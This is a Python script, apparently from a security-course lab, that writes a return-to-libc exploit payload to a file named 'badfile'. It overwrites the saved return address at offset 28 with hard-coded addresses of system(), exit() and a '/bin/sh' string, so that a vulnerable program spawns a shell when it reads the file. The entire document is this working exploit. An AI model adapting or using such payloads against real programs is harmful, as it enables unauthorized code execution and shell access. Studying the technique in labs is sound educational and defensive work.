#!/usr/bin/python3
import sys

content = bytearray(0xaa for i in range(300))

sh_addr = 0xffffd2b7  # The address of "/bin/sh". This value may change!
system_addr = 0xf7db7030  # The address of system(). This value may change!
exit_addr = 0xf7da98e0  # The address of exit(). This value may change!


X = 28 # the difference between the frame pointer address
# and the buffer[] address, both printed on the terminal by the retlibc program,
# is 24. In addition to this, you have also to consider the 4 bytes where base
# pointer is located. Thus, the location of the return address is
# 24(buffer) + 4(base pointer)=28 bytes away.
content[X:X+4] = (system_addr).to_bytes(4, byteorder='little')
content[X+4:X+8] = (exit_addr).to_bytes(4, byteorder='little')
content[X+8:X+12] = (sh_addr).to_bytes(4, byteorder='little')

with open("badfile", "wb") as f:
    f.write(content)

print("[+] Exploit successfully printed to \"badfile\".")
